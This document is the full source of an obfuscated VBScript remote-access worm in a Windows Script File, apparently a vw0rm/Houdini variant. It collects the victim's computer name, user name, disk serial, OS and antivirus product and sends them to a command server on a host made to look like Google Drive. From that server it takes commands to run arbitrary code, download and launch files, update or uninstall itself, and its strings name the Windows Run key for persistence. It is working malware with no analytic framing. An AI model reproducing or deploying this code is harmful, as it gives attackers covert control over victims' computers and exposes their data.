<job id="0.0.0.0">
<script language="VBScript">
Dim arr
arr = Array (Chr(101)&Chr(120)&Chr(101)&Chr(99)&Chr(117)&Chr(116)&Chr(101)&Chr(32)&Chr(83)&Chr(40)&Chr(49)&Chr(41), "w.quit", "go=a.displayName", "W.Sleep 6000", "Set B=GetObject(y(0)).InstancesOf(y(m))","set w = WScript","Set B=GetObject(y(3)).InstancesOf(y(4))","X.send A","Pt=X.responsetext","nf=nf&s&c","fu = w.scriptfullname","wn=w.scriptname","set wr = fs.OpenTextFile(fu,1)","f = wr.ReadAll","wr.close()","f = replace(f,ch&vn&ch,ch&s(1)&ch)","set wr = fs.OpenTextFile(fu,2,false)","wr.Write f","wr.close()","X.Open ""POST"",""http://google-drive.myq-see.com:5399/""&C,false","X.setrequestheader ""User-Agent:"",nf","nf=nf&s&c&c&nt&c&u&c","vn=""vw0rm""","T=""winmgmts:\\localhost\root\securitycenter""","s=ex(""COMPUTERNAME"")","s=ex(""USERNAME"")","s(1) = replace(s(1),""|U|"",""|V|"")","set wr = fs.OpenTextFile(fu,2,false)","S(1) = replace(S(1),""%f"",fu)","S(1) = replace(S(1),""%n"",wn)","S(1) = replace(S(1),""%sfdr"",dr)")
On error resume next
j = array(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108),"Scripting.FileSystemObject","Shell.Application","Microsoft.XMLHTTP")
g = array(Chr(72)&Chr(75)&Chr(67)&Chr(85),"HKLM","HKCU\vw0rm","\Software\Microsoft\Windows\CurrentVersion\Run\","HKLM\SOFTWARE\Classes\","REG_SZ","\defaulticon\")
y= array(Chr(119)&Chr(105)&Chr(110)&Chr(109)&Chr(103)&Chr(109)&Chr(116)&Chr(115)&Chr(58),"win32_logicaldisk","Win32_OperatingSystem","winmgmts:\\localhost\root\securitycenter","AntiVirusProduct")
function go(m)
if m=4 then
Execute(arr(23))
Execute(arr(6))
for each a in b
Execute(arr(2))
exit for
next
Set B=GetObject(y(3) & Chr(50)).InstancesOf(y(4))
for each a in b
go=a.displayName
exit for
next
if go="" then go="Not-found"
else
Execute(arr(4))
for each a in b
if m = 1 then
go=a.volumeserialnumber
elseif m = 2 then
go=a.caption
end if
exit for
next
end if
end function
Execute(arr(5))
set sh = Cr(0)
set fs = Cr(1)
Function Cr(N)
Set Cr = CreateObject(j(N))
End Function
function Ex(s)
Ex = sh.ExpandEnvironmentStrings(Chr(37)&s&Chr(37))
end function
function Pt(C,A)
Pt=""
Set X=Cr(3)
Execute(arr(19))
Execute(arr(20))
Execute(arr(7))
Execute(arr(8))
end function
Function nf
nf=""
i=go(1)
s=VN & Chr(95) & i
nf=nf&s&c
Execute(arr(24))
nf=nf&s&c
Execute(arr(25))
execute (arr(9))
s=go(2)
nf=nf&s&c
s=go(4)
Execute(arr(21))
End Function
Execute(arr(22))
U=""
ch = chrw(34)
c = chrw(92)
Execute(arr(10))
Execute(arr(11))
NT=Chr(78)&Chr(111)
if fs.fileexists(ex(Chr(87)&Chr(105)&Chr(110)&Chr(100)&Chr(105)&Chr(114)) & "\Microsoft.NET\Framework\v2.0.50727\vbc.exe") then
NT=Chr(89)&Chr(101)&Chr(115)
end if
U= sh.regread(g(2))
if U="" then
if mid(fu,2)=Chr(58)&Chr(92) & wn then
U=Chr(84)&Chr(82)&Chr(85)&Chr(69)
sh.regwrite g(2), U, g(5)
else
U=Chr(70)&Chr(65)&Chr(76)&Chr(83)&Chr(69)
sh.regwrite g(2), U, g(5)
end if
end if
spl=Chr(124)&Chr(86)&Chr(124)
while true
s=split(Pt(Chr(86)&Chr(114)&Chr(101),""),spl)
select case s(0)
case Chr(101)&Chr(120)&Chr(99)
sa= s(1)
execute sa
case Chr(83)&Chr(99)
s2 = Ex(Chr(116)&Chr(101)&Chr(109)&Chr(112)) & "\" & s(2)
set wr = fs.OpenTextFile(s2,2,True)
wr.Write s(1)
wr.Close()
sh.run s2, 6
case Chr(82)&Chr(70)
s2 = Ex(Chr(116)&Chr(101)&Chr(109)&Chr(112)) & "\" & s(2)
set wr = fs.OpenTextFile(s2,2,True)
wr.Write s(1)
wr.Close()
sh.run s2
case Chr(82)&Chr(101)&Chr(110)
Execute(arr(12))
Execute(arr(13))
Execute(arr(14))
Execute(arr(15))
Execute(arr(16))
Execute(arr(17))
Execute(arr(18))
case Chr(85)&Chr(112)
Execute(arr(27))
Execute(arr(26))
wr.Write s(1)
wr.Close()
sh.run Chr(119)&Chr(115)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(101)&Chr(120)&Chr(101)&Chr(32)&Chr(47)&Chr(47)&Chr(66)&Chr(32) & ch & fu & ch, 6
w.quit
case Chr(67)&Chr(108)
W.quit
case Chr(85)&Chr(110)
Execute(arr(28))
Execute(arr(29))
Execute(arr(30))
execute (arr(0))
execute (arr(1))
end select
execute (arr(3))
wend
</script>
</job>